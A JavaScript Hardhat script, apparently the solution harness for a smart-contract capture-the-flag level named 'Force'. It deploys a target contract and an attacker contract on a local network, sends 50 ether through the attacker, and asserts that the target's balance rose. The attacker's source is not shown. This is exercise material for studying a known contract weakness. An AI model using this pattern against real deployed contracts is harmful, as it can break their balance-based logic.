// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const { expect } = require("chai");

async function main() {
    // Hardhat always runs the compile task when running scripts with its command
    // line interface.
    //
    // If this script is run directly using `node` you may want to call compile
    // manually to make sure everything is compiled
    // await hre.run('compile');

    // We get the contract to deploy

    Force = await hre.ethers.getContractFactory("Force");
    const f = await Force.deploy();
    await f.deployed();

    const balance1 = await hre.ethers.provider.getBalance(f.address);


    ForceAtt = await hre.ethers.getContractFactory("ForceAtt");
    const att = await ForceAtt.deploy();
    await att.deployed();




    const attackTx = await att.attack(f.address, { value: hre.ethers.utils.parseEther("50") })
    await attackTx.wait()

    const balance2 = await hre.ethers.provider.getBalance(f.address);

    expect(balance2.sub(balance1).gt(0)).to.equal(true);
}


// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
